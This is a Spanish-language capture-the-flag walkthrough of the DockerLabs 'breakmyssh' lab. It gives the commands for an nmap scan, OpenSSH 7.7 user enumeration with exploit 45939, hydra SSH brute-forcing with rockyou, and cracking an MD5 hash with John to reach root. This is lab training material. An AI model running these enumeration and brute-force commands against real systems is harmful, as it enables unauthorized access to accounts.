Deplegamos maquina de dockerlabs con

`sudo ./auto_deploy.sh breakmyssh.tar`

hacemos un brarido con nmap para lista los puertos abiertios usando 

`sudo nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN scaning.txt`

![[Pasted image 20240615112936.png]]
observamos que solo se encientra el puerto 22  abierto  ssh con un version 7.7.  Esto  no da nocion para investigar si tienen vulnerabilidades este puerto asi que usando `searchsploit` investigamos que posdemons hacer

`searchsploit OpenSSH 7.7`

![[Pasted image 20240615113841.png]]
luego de  investigar vemos encontramos varios exploits de enumeracion de usuarios. en este caso la usaremos el exploit  45939 que la versimon 2 del mismo que se encuentra al inicio de la lista

`searchsploit -m linux/remote/45939.py`

luego de tenerlos en nuestra carperta conel el comando anterior lo renombramos con el nombre de exploit.py,  y seguimos las instrucciones para ejecuntarlo y pasar una lista se usarios y ver que cuales son validos.

usando esta la siguiente liene de comando 

`cat /usr/share/wordlists/rockyou.txt | while read use; do python2 exploit.py 172.17.0.2 $use 2>/dev/null; done | grep -vi invalid`

validamos que usarion son validos a nivel de sistama ya que leyendo el rockyou creamos un cilclo donde vamos interando por cada nombre  y  adicional quitamos todos los usuarios que tenta el invalid en alguna de sus linea de esta manera solo veremos los usuarios vaidos

![[Pasted image 20240615121025.png]]

vemos que el usario lovely es valido asi que para proceder usaremos la heramineta hydar para ver si el usario tiene un contraseña que se liste en un fichero como lo es el rockyou

`hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

bingo hemos encontra un usaruo y constraseña valido para inicar secion en ssh usando hydara
![[Pasted image 20240615123133.png]]
 ahora con el usuarios lovely y al contraseña rockyou inicamis sesion por SSH entra a la maquina 

`ssh lovely@172.17.0.2`

luego de busacar por varios minutos y haber buscado por todo el entramos a la carperta opt y ejecutando `ls -la` ya vemos una archivo oculto .hash que el siguiente `aa87ddc5b4c24406d26ddad771ef44b0` pasando por hashid nos dan como resultado que un hash md5.
![[Pasted image 20240615124516.png]]

asi que procedemos a decodificar este hash usando joho the riper

john -w /usr/share/wordlists/rockyou.txt hash --format=Raw-md5

![[Pasted image 20240615125327.png]]
asi que encontramos dos posible contraseñas para porobar con el usario root
 usando de nuevo hydara vemos que el la contraseña del usurio root es estrella
![[Pasted image 20240615125603.png]]
asi inicimos secion y hemos consegudo nuestr  maquina de dcokerlabs breakssh
